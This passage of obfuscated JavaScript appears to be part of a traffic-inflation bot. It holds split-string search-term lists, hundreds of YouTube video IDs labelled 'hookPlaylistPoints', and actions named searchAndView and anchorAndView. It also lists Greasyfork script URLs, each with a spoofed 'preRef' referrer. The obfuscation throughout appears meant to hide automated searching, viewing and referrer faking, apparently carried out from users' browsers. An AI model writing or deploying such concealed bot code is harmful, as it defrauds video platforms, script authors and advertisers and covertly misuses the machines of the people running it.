'\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + V(0xf) + 'necraft\x20pe' + ',monster\x20s' + W(0x7, 'SjR&') + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + W(0x1a, 'P)z4') + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x12b9 + 0x14d8 + 0x1 * -0x2787)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x3 * 0x896 + -0x2 * -0x70b + -0x27ce)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x13d5 + -0x11db * 0x2 + 0x378e);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    X(0x9) + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    W(0x10, 'i#sY') + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    V(0x1) + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + X(0x18) + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0x11) + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + V(0xc) + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + W(0x19, 'SjR&') + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0xd) + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': W(0x8, 'ETDK') + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + V(0x14) + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
